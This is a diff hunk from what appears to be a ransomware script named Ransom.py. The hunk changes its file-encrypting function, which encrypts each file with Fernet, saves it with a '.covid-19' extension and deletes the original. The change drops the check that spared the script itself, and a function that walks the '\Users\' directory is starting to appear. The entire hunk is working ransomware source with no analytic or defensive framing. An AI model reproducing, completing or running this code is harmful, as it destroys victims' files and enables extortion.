@@ -13,20 +13,19 @@ def genkey(name):
         file.write(key)
 # FILE ENCYPTING FUNCTION
 def file_ecrypt(key, name):
-    if (name!="Ransom.py"):
-        with open(name,'rb') as files:
-            data = files.read()
+    with open(name,'rb') as files:
+        data = files.read()
 
-        fernet = Fernet(key)
-        encrypted = fernet.encrypt(data)
-        encrypted_file = name + ".covid-19"
-        try:
-            with open(encrypted_file, 'wb') as files:
-                files.write(encrypted)
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
+    encrypted_file = name + ".covid-19"
+    try:
+        with open(encrypted_file, 'wb') as files:
+            files.write(encrypted)
 
-            os.remove(name)
-        except:
-            pass
+        os.remove(name)
+    except:
+        pass
 # LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
 def filelist():
     rep = ['\\Users\\']
